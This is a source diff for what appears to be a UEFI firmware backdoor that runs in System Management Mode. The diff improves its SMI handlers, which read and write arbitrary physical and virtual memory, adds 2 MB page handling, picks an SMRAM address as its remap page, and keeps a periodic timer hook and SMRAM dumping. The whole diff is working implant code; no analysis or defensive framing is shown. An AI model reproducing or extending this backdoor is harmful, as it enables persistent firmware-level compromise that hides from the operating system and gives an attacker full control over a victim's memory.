@@ -77,7 +77,7 @@ BOOLEAN m_bInfectedImage = FALSE;
 EFI_HANDLE m_ImageHandle = NULL;
 PVOID m_ImageBase = NULL;
 
-PBACKDOOR_INFO g_BackdoorInfo = NULL;
+PBACKDOOR_INFO m_BackdoorInfo = NULL;
 
 // serial I/O interface for debug purposes
 EFI_SERIAL_IO_PROTOCOL *m_SerialIo = NULL;
@@ -227,7 +227,7 @@ BOOLEAN SerialInit(VOID)
 PVOID BackdoorImageAddress(void)
 {
     PVOID Addr = _get_addr();
-    PVOID Base = (PVOID)XALIGN_DOWN((UINT64)Addr, DEFAULT_EDK_ALIGN);
+    PVOID Base = (PVOID)((UINT64)Addr & ~(DEFAULT_EDK_ALIGN - 1));
 
     // get current module base by address inside of it
     while (*(PUSHORT)Base != EFI_IMAGE_DOS_SIGNATURE)
@@ -432,7 +432,7 @@ VOID BackdoorEntryResident(PVOID Image)
 EFI_STATUS SmmCallHandle(UINT64 Code, UINT64 Arg1, UINT64 Arg2, PCONTROL_REGS ControlRegs)
 {
     EFI_STATUS Status = EFI_INVALID_PARAMETER;   
-    PUCHAR Buff = (PUCHAR)RVATOVA(g_BackdoorInfo, PAGE_SIZE); 
+    PUCHAR Buff = (PUCHAR)RVATOVA(m_BackdoorInfo, PAGE_SIZE); 
 
     switch (Code)
     {
@@ -449,6 +449,7 @@ EFI_STATUS SmmCallHandle(UINT64 Code, UINT64 Arg1, UINT64 Arg2, PCONTROL_REGS Co
     case BACKDOOR_SW_DATA_WRITE_PHYS_PAGE:
     case BACKDOOR_SW_DATA_WRITE_PHYS_DWORD:
         {
+            BOOLEAN bLargePage = FALSE;
             UINTN i = 0, Len = PAGE_SIZE;
             UINT64 Addr = 0;
              
@@ -458,7 +459,7 @@ EFI_STATUS SmmCallHandle(UINT64 Code, UINT64 Arg1, UINT64 Arg2, PCONTROL_REGS Co
                 {
                     DbgMsg(__FILE__, __LINE__, "ERROR: IA-32e paging is not enabled\r\n");
                     
-                    Status = EFI_INVALID_PARAMETER;
+                    Status = EFI_UNSUPPORTED;
                     goto _end;
                 }
 
@@ -502,9 +503,18 @@ EFI_STATUS SmmCallHandle(UINT64 Code, UINT64 Arg1, UINT64 Arg2, PCONTROL_REGS Co
             }            
 
             // map physical address
-            if (VirtualAddrRemap(m_DummyPage, Arg1, __readcr3()))
+            if (m_DummyPage != 0 && VirtualAddrRemap(m_DummyPage, Arg1, __readcr3(), &bLargePage))
             {
-                UINT64 TargetAddr = m_DummyPage + PAGE_OFFSET_4K(Arg1);
+                UINT64 TargetAddr = m_DummyPage;
+
+                if (bLargePage)
+                {
+                    TargetAddr += PAGE_OFFSET_2M(Arg1);   
+                }
+                else
+                {
+                    TargetAddr += PAGE_OFFSET_4K(Arg1);
+                }
 
                 for (i = 0; i < Len; i += 1)
                 {
@@ -522,11 +532,15 @@ EFI_STATUS SmmCallHandle(UINT64 Code, UINT64 Arg1, UINT64 Arg2, PCONTROL_REGS Co
                 }
 
                 // revert old mapping
-                VirtualAddrRemap(m_DummyPage, m_DummyPage, __readcr3());
+                VirtualAddrRemap(m_DummyPage, m_DummyPage, __readcr3(), NULL);
 
                 Status = EFI_SUCCESS;
             }   
-            
+            else
+            {
+                Status = EFI_NO_MAPPING;
+            }
+
             break;
         }
 
@@ -535,6 +549,7 @@ EFI_STATUS SmmCallHandle(UINT64 Code, UINT64 Arg1, UINT64 Arg2, PCONTROL_REGS Co
     case BACKDOOR_SW_DATA_WRITE_VIRT_PAGE:
     case BACKDOOR_SW_DATA_WRITE_VIRT_DWORD:
         {
+            BOOLEAN bLargePage = FALSE;
             UINTN i = 0, Len = PAGE_SIZE;
             UINT64 Addr = 0;
 
@@ -542,7 +557,7 @@ EFI_STATUS SmmCallHandle(UINT64 Code, UINT64 Arg1, UINT64 Arg2, PCONTROL_REGS Co
             {
                 DbgMsg(__FILE__, __LINE__, "ERROR: IA-32e paging is not enabled\r\n");
                 
-                Status = EFI_INVALID_PARAMETER;
+                Status = EFI_UNSUPPORTED;
                 goto _end;
             }
 
@@ -590,9 +605,18 @@ EFI_STATUS SmmCallHandle(UINT64 Code, UINT64 Arg1, UINT64 Arg2, PCONTROL_REGS Co
                 }                
 
                 // map physical address
-                if (VirtualAddrRemap(m_DummyPage, Addr, __readcr3()))
+                if (m_DummyPage != 0 && VirtualAddrRemap(m_DummyPage, Addr, __readcr3(), &bLargePage))
                 {
-                    UINT64 TargetAddr = m_DummyPage + PAGE_OFFSET_4K(Addr);
+                    UINT64 TargetAddr = m_DummyPage;
+
+                    if (bLargePage)
+                    {
+                        TargetAddr += PAGE_OFFSET_2M(Addr);
+                    }
+                    else
+                    {
+                        TargetAddr += PAGE_OFFSET_4K(Addr);
+                    }
 
                     for (i = 0; i < Len; i += 1)
                     {
@@ -610,9 +634,13 @@ EFI_STATUS SmmCallHandle(UINT64 Code, UINT64 Arg1, UINT64 Arg2, PCONTROL_REGS Co
                     }
 
                     // revert old mapping
-                    VirtualAddrRemap(m_DummyPage, m_DummyPage, __readcr3());
+                    VirtualAddrRemap(m_DummyPage, m_DummyPage, __readcr3(), NULL);
 
                     Status = EFI_SUCCESS;
+                }
+                else
+                {
+                    Status = EFI_NO_MAPPING;
                 }
             }
             else
@@ -621,6 +649,8 @@ EFI_STATUS SmmCallHandle(UINT64 Code, UINT64 Arg1, UINT64 Arg2, PCONTROL_REGS Co
                     __FILE__, __LINE__, 
                     "ERROR: Unable to resolve physical address for 0x%llx\r\n", Arg1
                 );
+
+                Status = EFI_NOT_FOUND;
             }
 
             break;
@@ -630,7 +660,7 @@ EFI_STATUS SmmCallHandle(UINT64 Code, UINT64 Arg1, UINT64 Arg2, PCONTROL_REGS Co
         {         
             if (m_PeriodicTimerDispatchHandle == NULL)
             {
-                g_BackdoorInfo->TicksCount = 0;
+                m_BackdoorInfo->TicksCount = 0;
 
                 // enable periodic timer handler
                 PeriodicTimerDispatch2Register(&m_PeriodicTimerDispatchHandle);    
@@ -703,7 +733,7 @@ EFI_STATUS SmmCallHandle(UINT64 Code, UINT64 Arg1, UINT64 Arg2, PCONTROL_REGS Co
             {
                 DbgMsg(__FILE__, __LINE__, "ERROR: IA-32e paging is not enabled\r\n");
                 
-                Status = EFI_INVALID_PARAMETER;
+                Status = EFI_UNSUPPORTED;
                 goto _end;
             }
 
@@ -819,7 +849,7 @@ EFI_STATUS SmmCallHandle(UINT64 Code, UINT64 Arg1, UINT64 Arg2, PCONTROL_REGS Co
 
 _end:
 
-    g_BackdoorInfo->BackdoorStatus = Status;
+    m_BackdoorInfo->BackdoorStatus = Status;
 
     return Status;
 }
@@ -856,14 +886,14 @@ EFI_STATUS EFIAPI PeriodicTimerDispatch2Handler(
     EFI_STATUS Status = EFI_SUCCESS;   
     EFI_SMM_CPU_PROTOCOL *SmmCpu = NULL;    
 
-    if (g_BackdoorInfo == NULL)
+    if (m_BackdoorInfo == NULL)
     {
         // we need this structure for communicating with the outsude world
         goto _end;
     }
 
     m_PeriodicTimerCounter += 1;
-    g_BackdoorInfo->TicksCount = m_PeriodicTimerCounter;
+    m_BackdoorInfo->TicksCount = m_PeriodicTimerCounter;
 
     Status = m_Smst->SmmLocateProtocol(&gEfiSmmCpuProtocolGuid, NULL, (PVOID *)&SmmCpu);
     if (Status == EFI_SUCCESS)
@@ -1025,7 +1055,7 @@ EFI_STATUS EFIAPI SwDispatch2Handler(
         SwContext->CommandPort, SwContext->DataPort
     );
 
-    if (g_BackdoorInfo == NULL)
+    if (m_BackdoorInfo == NULL)
     {
         // we need this structure for communicating with the outsude world
         goto _end;
@@ -1170,20 +1200,20 @@ EFI_STATUS EFIAPI EndOfDxeProtocolNotifyHandler(
 {        
     DbgMsg(__FILE__, __LINE__, "End of DXE phase\n");
 
-    if (g_BackdoorInfo)
+    if (m_BackdoorInfo)
     {        
 
 #ifdef USE_SMRAM_AUTO_DUMP
 
         UINTN Offset = 0, p = 0, i = 0;
-        PUCHAR Buff = (PUCHAR)RVATOVA(g_BackdoorInfo, PAGE_SIZE); 
+        PUCHAR Buff = (PUCHAR)RVATOVA(m_BackdoorInfo, PAGE_SIZE); 
 
         gBS->SetMem(Buff, MAX_SMRAM_SIZE, 0);
 
         // enumerate available SMRAM regions
         for (;;)
         {
-            EFI_SMRAM_DESCRIPTOR *Info = &g_BackdoorInfo->SmramMap[i];
+            EFI_SMRAM_DESCRIPTOR *Info = &m_BackdoorInfo->SmramMap[i];
 
             if (Info->PhysicalStart == 0 || Info->PhysicalSize == 0)
             {
@@ -1216,19 +1246,19 @@ EFI_STATUS EFIAPI EndOfDxeProtocolNotifyHandler(
             i += 1;
         }
 
-        g_BackdoorInfo->BackdoorStatus = BACKDOOR_INFO_FULL;
+        m_BackdoorInfo->BackdoorStatus = BACKDOOR_INFO_FULL;
 
 #else // USE_SMRAM_AUTO_DUMP
 
-        g_BackdoorInfo->BackdoorStatus = EFI_INVALID_PARAMETER;
+        m_BackdoorInfo->BackdoorStatus = EFI_INVALID_PARAMETER;
 
 #endif // USE_SMRAM_AUTO_DUMP
 
 #ifdef USE_MSR_SMM_MCA_CAP
 
         // read MSR_SMM_MCA_CAP and MSR_SMM_FEATURE_CONTROL registers
-        g_BackdoorInfo->SmmMcaCap = __readmsr(MSR_SMM_MCA_CAP);
-        g_BackdoorInfo->SmmFeatureControl = __readmsr(MSR_SMM_FEATURE_CONTROL);
+        m_BackdoorInfo->SmmMcaCap = __readmsr(MSR_SMM_MCA_CAP);
+        m_BackdoorInfo->SmmFeatureControl = __readmsr(MSR_SMM_FEATURE_CONTROL);
 
 #endif
         
@@ -1300,31 +1330,10 @@ VOID BackdoorEntrySmm(VOID)
     EFI_STATUS Status = EFI_SUCCESS;
     EFI_SMM_PERIODIC_TIMER_DISPATCH2_PROTOCOL *PeriodicTimerDispatch = NULL;
     EFI_SMM_SW_DISPATCH2_PROTOCOL *SwDispatch = NULL;    
-    EFI_PHYSICAL_ADDRESS Addr = 0;
 
     DbgMsg(__FILE__, __LINE__, "Running in SMM\r\n");
     DbgMsg(__FILE__, __LINE__, "SMM system table is at "FPTR"\r\n", m_Smst);    
-
-    // allocate dummy memory page to use as target for VirtualAddrRemap()
-    Status = m_Smst->SmmAllocatePages(
-        AllocateAnyPages,
-        EfiRuntimeServicesData,
-        1, &Addr
-    );
-    if (Status == EFI_SUCCESS)
-    {
-        m_DummyPage = Addr;
-
-        gBS->SetMem((VOID *)Addr, PAGE_SIZE, 0xff);
-
-        DbgMsg(__FILE__, __LINE__, "Dummy page allocated is at "FPTR"\r\n", m_DummyPage);
-    }
-    else
-    {
-        DbgMsg(__FILE__, __LINE__, "SmmAllocatePages() fails: 0x%X\r\n", Status);
-        return;
-    }
-
+    
     #define REGISTER_NOTIFY(_name_)                                 \
                                                                     \
         RegisterProtocolNotifySmm(&gEfiSmm##_name_##ProtocolGuid,   \
@@ -1485,14 +1494,14 @@ EFI_STATUS BackdoorEntry(EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE *SystemTable)
         }
     }     
 
-    if ((g_BackdoorInfo = BackdoorInfoGet()) != NULL)
+    if ((m_BackdoorInfo = BackdoorInfoGet()) != NULL)
     {
         DbgMsg(
             __FILE__, __LINE__, "Previous calls count is %d\r\n", 
-            g_BackdoorInfo->CallsCount
+            m_BackdoorInfo->CallsCount
         );
 
-        g_BackdoorInfo->CallsCount += 1;
+        m_BackdoorInfo->CallsCount += 1;
     }
 
     Status = gBS->LocateProtocol(&gEfiSmmBase2ProtocolGuid, NULL, (PVOID *)&SmmBase);
@@ -1500,7 +1509,7 @@ EFI_STATUS BackdoorEntry(EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE *SystemTable)
     {
         BOOLEAN bInSmram = FALSE;
 
-        if (g_BackdoorInfo)
+        if (m_BackdoorInfo)
         {
             Status = gBS->LocateProtocol(&gEfiSmmAccess2ProtocolGuid, NULL, (PVOID *)&SmmAccess);
             if (Status == EFI_SUCCESS)
@@ -1511,12 +1520,19 @@ EFI_STATUS BackdoorEntry(EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE *SystemTable)
                 Status = SmmAccess->GetCapabilities(
                     SmmAccess,
                     &SmramMapSize,
-                    g_BackdoorInfo->SmramMap
+                    m_BackdoorInfo->SmramMap
                 );
-                if (Status != EFI_SUCCESS)
+                if (Status == EFI_SUCCESS)
+                {
+                    /*
+                        Use beginnig of the SMRAM as dummy page for VirtualAddrRemap()
+                    */
+                    m_DummyPage = m_BackdoorInfo->SmramMap[0].PhysicalStart;
+                }
+                else
                 {
                     DbgMsg(__FILE__, __LINE__, "GetCapabilities() fails: 0x%X\r\n", Status);
-                }
+                }                
             }
         }
 
